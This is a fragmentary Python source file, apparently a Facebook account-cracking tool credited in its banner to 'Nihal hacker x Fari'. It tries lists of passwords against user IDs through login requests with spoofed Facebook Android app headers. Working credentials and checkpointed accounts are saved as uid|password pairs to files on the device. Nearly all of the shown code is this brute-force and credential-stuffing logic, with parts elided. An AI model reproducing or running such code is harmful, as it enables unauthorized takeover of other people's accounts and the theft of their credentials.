    ...
    try:
        ...
        for ps in pword:
            ...
            if "session_key" in result:
                print(f" {g}[N x F-OK] {uid} | {pw}")
                open("/sdcard/N x F- File-Ok.txt", "a").write(f"{uid}|{pw}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                print(f" {r}[] {uid} | {pw}")
                open("/sdcard/N x F- File-Cp.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
...
def m1(uid, pword, total_idz):
    ...
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[N x F-M1] [{loop}/{total_idz}] [{len(okacc)}/{len(cpacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = str(random_ua())
            ...
            headers = {
                ...
                "x-fb-friendly-name": "authenticate", 
                "x-fb-http-engine": "Liger",
                "user-agent": "[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=3.75,width=1080,height=2400};FBLC/en_NZ;FBRV/str(random.randint(000000000 ,999999999));FBCR/Etisalat Af;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/CPH2209;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
            }
            ...
            if "session_key" in result:
                ...
                open("/sdcard/N x F-OK.txt", "a").write(f"{uid}|{pw}\n")
                okacc.append(uid)
                break
            elif result["error_code"] == 405:
                print(f" {r}[N x F-CP] {uid} | {pw}")
                open("/sdcard/N x F-CP.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
...
def m2(uid, pword, total_idz):
    ...
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[N x F-M2] [{loop}/{total_idz}] [{len(okacc)}/{len(cpacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = str(random_ua())
...
{g}d8b   db      db    db      d88888b 
{b}888o  88      `8b  d8'      88'     
{p}88V8o 88       `8bd8'       88ooo   
{w}88 V8o88       .dPYb.       88~~~   
{y} 88  V888      .8P  Y8.      88      
{g}VP   V8P      YP    YP      YP
{w}==================================================
{w}[•] AUTHOR       : Nihal hacker x Fari
{w}[•] Nihal Ki gf     : Fari
